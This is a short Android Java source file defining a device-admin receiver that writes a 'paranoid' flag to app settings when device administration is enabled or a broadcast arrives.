package com.service.app.Main;


import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

import androidx.annotation.NonNull;

import com.service.app.Services.utils;


public class ReceiverDeviceAdmin extends DeviceAdminReceiver {
    utils utl = new utils();
    @Override
    public void onReceive(Context context, Intent intent)
    {
        utl.SettingsWrite(context.getApplicationContext(), "paranoid","1");
    }

    @Override
    public void onEnabled(@NonNull Context context, @NonNull Intent intent) {
        super.onEnabled(context, intent);
        utl.SettingsWrite(context.getApplicationContext(), "paranoid","1");
    }
}
